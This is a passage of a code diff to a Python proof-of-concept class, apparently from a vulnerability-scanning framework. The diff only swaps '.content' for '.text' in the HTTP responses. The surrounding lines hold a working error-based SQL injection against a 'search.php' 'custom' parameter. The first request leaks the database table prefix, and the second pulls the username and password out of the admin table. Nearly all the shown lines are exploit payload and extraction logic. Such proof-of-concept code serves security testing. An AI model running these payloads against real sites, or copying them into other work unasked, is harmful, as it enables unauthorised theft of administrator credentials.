@@ -76,7 +76,7 @@ class Poc(ABPoc):
                       '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                       'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
             verify_url = self.target + payload
-            response = requests.get(verify_url).content
+            response = requests.get(verify_url).text
             table_pre = match_table_pre.findall(response)[0]
             # 2
             payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20' \
@@ -84,7 +84,7 @@ class Poc(ABPoc):
                       '{0}_admin%20limit%201),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH' \
                       'EMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'.format(
                           table_pre)
-            response = requests.get(self.target + payload).content
+            response = requests.get(self.target + payload).text
             username, password = match_result.findall(response)[0]
 
             if username and password:
